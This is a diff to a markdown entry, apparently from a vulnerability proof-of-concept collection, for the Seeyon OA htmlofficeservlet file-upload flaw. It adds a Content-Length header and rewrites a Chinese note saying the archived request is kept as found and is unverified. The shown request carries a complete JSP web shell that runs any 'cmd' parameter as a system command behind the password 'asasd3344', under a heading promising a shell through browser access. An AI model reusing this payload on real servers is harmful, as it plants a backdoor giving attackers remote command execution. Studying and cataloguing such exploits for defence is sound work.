@@ -70,6 +70,7 @@ schema_version: "1"
 ```http
 POST /seeyon/htmlofficeservlet HTTP/1.1
 Host: XXX
+Content-Length: 1251
  
  
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0
@@ -89,7 +90,7 @@ originalCreateDate=wLSGP4oEzLKAz4=iz=66
 <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%@if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 1251；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求原样保留：同一归档代码块含 `Content-Length: 1251` 和 `Content-Length: 1122`，且头部之间有空行，存在消息边界与长度歧义。这里保留原始证据，不能将其视为已验证可用的请求；本文没有证明请求走私或特定解析结果。
 
 #### 浏览器访问即可getshell
 
